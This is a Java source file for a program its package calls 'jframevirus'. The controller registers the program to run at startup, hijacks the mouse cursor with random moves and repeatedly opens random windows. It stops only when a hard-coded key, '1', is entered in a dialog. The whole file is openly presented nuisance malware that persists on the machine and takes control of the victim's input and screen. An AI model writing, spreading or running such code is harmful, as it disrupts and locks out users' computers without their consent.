package com.joo.jframevirus;

import com.joo.jframevirus.autostart.AutoStartManager;
import com.joo.jframevirus.keydialog.FailureException;
import com.joo.jframevirus.keydialog.KeyDialog;

import java.awt.*;
import java.awt.event.KeyEvent;

public class MainController {
    private Dimension screenSize;
    private Robot robot;
    private Thread mouseThread,
            jframeThread;
    private KeyDialog keyDialog;

    public static final String KEY = "1";

    public MainController() {
        init();
        AutoStartManager.getInstance().addVirusToStartup();
        startMouseMoving();
        startRandomFrame();
        setupWindowListener();
    }

    private void init() {
        screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        try {
            robot = new Robot();
        } catch (AWTException e) {
            e.printStackTrace();
        }
        initializeThreads();
        keyDialog = new KeyDialog();
    }

    private void initializeThreads() {
        initializeMouseThread();
        initializeJFrameThreads();
    }

    private void initializeJFrameThreads() {
        jframeThread = new Thread(() -> {
            // TODO: 5/16/22 Make this a while loop
            for (int i = 0; i < 100; i++) {
                new RandomFrame(screenSize);
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    private void initializeMouseThread() {
        mouseThread = new Thread(() -> {
            // TODO: 5/15/22 Make this a while loop
            for (byte i = 0; i < 10; i++) {
                robot.mouseMove((int) (Math.random() * screenSize.getWidth()),
                        (int) (Math.random() * screenSize.getHeight()));
            }
        });
    }

    // TODO: 5/15/22 Tst this in windows
    private void setupWindowListener() {
        KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(e -> {
            if (e.getID() == KeyEvent.KEY_PRESSED) {
                if (e.getKeyCode() == KeyEvent.VK_ESCAPE) {
                    // Pause the threads
                    pauseThreads();
                    // Show a dialog to get the key
                    virusStopKey();
                }
            }
            return false;
        });
    }

    private void pauseThreads() {
        try {
            mouseThread.join();
            jframeThread.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public void startMouseMoving() {
        mouseThread.start();
    }

    public void startRandomFrame() {
        jframeThread.start();
    }

    public void virusStopKey() {
        try {
            keyDialog.showDialog();
            // If continue then exit
            System.exit(0);
        } catch (FailureException e) {
            resumeThreads();
        }
    }

    private void resumeThreads() {
        synchronized(MainController.this) {
            MainController.this.notifyAll();
        }
    }
}
